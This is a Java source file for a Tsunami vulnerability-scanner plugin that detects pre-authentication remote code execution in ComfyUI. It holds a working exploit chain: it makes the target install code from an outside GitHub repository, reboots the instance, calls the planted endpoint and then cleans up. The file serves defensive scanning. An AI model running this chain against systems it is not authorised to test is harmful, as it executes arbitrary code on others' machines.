/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.comfyui.rce;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

/** A Tsunami plugin that detects a Pre-Auth Remote Code Execution in ComfyUI. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Pre-Auth Remote Code Execution in ComfyUI.",
    version = "0.1",
    description = "This plugin detects an unauthenticated remote code execution in ComfyUI.",
    author = "Savino Sisco (savio@doyensec.com), Leonardo Giovannini (leonardo@doyensec.com)",
    bootstrapModule = ComfyUiRemoteCodeExecutionBootstrapModule.class)
public final class ComfyUiRemoteCodeExecution implements VulnDetector {
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE = "ComfyUI Pre-Auth Remote Code Execution";

  private static final String PAYLOAD =
      "{\n"
          + //
          "    \"id\": \"ComfyUI-tsunami-payload\",\n"
          + //
          "    \"version\": \"nightly\",\n"
          + //
          "    \"selected_version\": \"nightly\",\n"
          + //
          "    \"skip_post_install\": false,\n"
          + //
          "    \"ui_id\": \"\",\n"
          + //
          "    \"mode\": \"remote\",\n"
          + //
          "    \"repository\": \"https://github.com/ltdrdata/ComfyUI-Manager\",\n"
          + //
          "    \"channel\":"
          + " \"https://raw.githubusercontent.com/doyensec/ComfyUI-tsunami-payload/be4a85a\"\n"
          + //
          "}";

  static final String VULNERABILITY_REPORT_DESCRIPTION_BASIC =
      "The scanner detected a ComfyUI instance vulnerable to remote code execution. The"
          + " vulnerability can be exploited by sending a sequence of unauthenticated HTTP requests"
          + " that would clone an arbitrary repository, reboot the instance and executes arbitrary"
          + " commands.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION =
      VULNERABILITY_REPORT_DESCRIPTION_BASIC
          + "The vulnerability was confirmed via response matching.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION = "Update the ComfyUI instance.";

  @VisibleForTesting static final String VERSION_ENDPOINT = "api/manager/version";

  @VisibleForTesting static final String INSTALL_ENDPOINT = "api/manager/queue/install";

  @VisibleForTesting static final String TRIGGER_ENDPOINT = "api/manager/queue/start";

  @VisibleForTesting static final String REBOOT_ENDPOINT = "api/manager/reboot";

  @VisibleForTesting static final String EXPLOIT_ENDPOINT = "tsunami_vulnerability_check";

  @VisibleForTesting
  static final String CLEANING_ENDPOINT = "tsunami_vulnerability_check_remove?delete=1";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  ComfyUiRemoteCodeExecution(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  // This is the main entry point of VulnDetector.
  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("ComfyUI Pre-Auth Remote Code Execution starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isComfyUi)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  /*
   * Fingerprint phase for ComfyUI.
   * This detects the service and the version
   */
  private boolean isComfyUi(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    HttpRequest req =
        HttpRequest.get(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
            .build();
    HttpResponse response;
    try {
      response = this.httpClient.send(req, networkService);
      Document doc = Jsoup.parse(response.bodyString().get());
      // Checking if the service is ComfyUI
      String title = doc.title();
      if (title.contains("ComfyUI")) {
        // Checking the version
        targetUri =
            NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VERSION_ENDPOINT;
        req =
            HttpRequest.get(targetUri)
                .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
                .build();
        logger.atInfo().log("Checking version: " + targetUri);
        response = this.httpClient.send(req, networkService);
        logger.atInfo().log("VERSION: " + response.bodyString().get());
        return true;
      } else {
        return false;
      }
    } catch (IOException e) {
      return false;
    }
  }

  // Checks whether a given ComfyUI instance is exposed and vulnerable.
  private boolean isServiceVulnerable(NetworkService networkService) {
    // The first HTTP request is used to inject the task, that later will be triggered.
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + INSTALL_ENDPOINT;
    logger.atInfo().log("Sending payload to '%s'", targetUri);
    HttpRequest req =
        HttpRequest.post(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .setRequestBody(ByteString.copyFromUtf8(PAYLOAD))
            .build();
    HttpResponse response = null;
    try {
      response = this.httpClient.send(req, networkService);
      if (response.status() != HttpStatus.OK) {
        return false;
      }
      // Task injected. The next request will trigger it.
      targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + TRIGGER_ENDPOINT;
      req =
          HttpRequest.get(targetUri)
              .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
              .build();

      response = this.httpClient.send(req, networkService);

      if (response.status() != HttpStatus.OK) {
        return false;
      }
      // Rebooting instance.
      targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + REBOOT_ENDPOINT;
      logger.atInfo().log("Rebooting instance '%s'", targetUri);
      req =
          HttpRequest.get(targetUri)
              .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
              .build();
      try{
        response = this.httpClient.send(req, networkService);
      }catch(IOException e){
        //This is intended to happen.
      }
      logger.atInfo().log("Waiting 60 seconds.");
      // Sleeping in order to give the time to the instance to reboot.
      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(60));

      // Achieving RCE.
      targetUri =
          NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
              + EXPLOIT_ENDPOINT
              + "?str1=TSUNAMI&str2=SECURITY&str3=SCANNER";
      logger.atInfo().log("Achieving RCE '%s'", targetUri);
      req =
          HttpRequest.get(targetUri)
              .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
              .build();
      response = this.httpClient.send(req, networkService);
      if (response.bodyString().isPresent()
          && response.bodyString().get().equals("TSUNAMIYTIRUCESSCANNER")) {
        logger.atInfo().log("RCE '%s'", response.bodyString().get());
        targetUri =
            NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + CLEANING_ENDPOINT;
        req =
            HttpRequest.get(targetUri)
                .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
                .build();
        this.httpClient.send(req, networkService);
        return true;
      } else {
        return false;
      }
    } catch (IOException e) {
      e.printStackTrace();
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher(VULNERABILITY_REPORT_PUBLISHER))
                .setSeverity(Severity.CRITICAL)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULNERABILITY_REPORT_DESCRIPTION)
                .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION))
        .build();
  }
}
